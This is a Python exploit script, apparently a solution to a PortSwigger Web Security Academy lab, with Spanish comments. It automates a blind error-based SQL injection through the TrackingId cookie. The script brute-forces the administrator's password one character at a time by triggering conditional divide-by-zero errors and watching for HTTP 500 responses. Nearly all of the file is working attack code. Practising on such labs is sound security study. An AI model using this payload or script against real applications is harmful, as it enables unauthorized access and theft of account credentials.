from signal import SIGINT
from pwn import *
import requests, time, pdb, sys, string
import os

def def_handler(sig, frame):
    print("\n\n[!]Saliendo....\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
main_url = "https://0ab3005203cce2ec8311199900a800d5.web-security-academy.net"
characters = string.ascii_lowercase + string.digits

def makeRequest():
    password = ""

    p1 = log.progress("fuerza bruta")
    p1.status("Iniciando ataque...")

    time.sleep(2)

    p2 = log.progress("password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': "jucRMZT2b2egOrcM'||(select case when substr(password,%d,1)= '%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character),
                'session': 'jmve0Q6yYAnWAawEPhMX00ASBtXaUxT9'
            }

            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if r.status_code == 500: #si el codic internal de la pag es 500, es el caracter bo
                password += character
                os.system("cls")
                p2.status(password)
                break


if __name__ == '__main__':

    makeRequest()
